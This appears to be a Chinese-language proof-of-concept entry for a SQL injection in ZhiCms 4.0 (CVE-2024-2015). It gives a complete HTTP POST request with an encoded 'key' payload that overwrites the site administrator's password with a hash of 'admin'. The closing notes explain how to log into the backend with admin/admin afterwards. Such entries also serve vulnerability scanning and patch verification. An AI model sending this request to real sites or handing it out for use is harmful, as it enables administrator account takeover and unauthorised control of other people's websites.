﻿# ZhiCms 4.0 SQL漏洞

> 更新时间：2024-04-30

> 漏洞编号：CVE-2024-2015

> 漏洞说明：在ZhiCms4.0中sql漏洞代码文件是app/index/controller/mcontroller.php中的getindexdata函数。对参数key进行恶意编码，然而会导致SQL注入，该漏洞编号为CVE-2024-2015，攻击者可直接修改原账户密码登操作。

> 漏洞特征：

> 验证脚本：HTTP

```
POST /index.php?r=index/m/getindexdata HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=gclnhtp52rldnj5p9ckp389h2h
Connection: close

action=search&key=%2525%2527%253Bupdate%2520yun%255Fmanage%2520set%2520password%253D%2527bbe375100175e7b98339a98e0a07083b%2527%2520where%2520id%253D%25271%2527%253BSELECT%2520%252A%2520FROM%2520%2560yun%255Farticle%2560%2520%2520WHERE%2520%2560title%2560%2520LIKE%2520%2520%2527%2525&mall=
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：ZhiCms 4.0 SQL漏洞.poc

```
备注说明：
1.以上poc可以将管理员密码重置为"admin"。
2.可以访问网站的管理员登录页面，网址为http://XXX.com/index.php?r=manage/login/index
3.然后使用admin/admin登录直接进入后台
```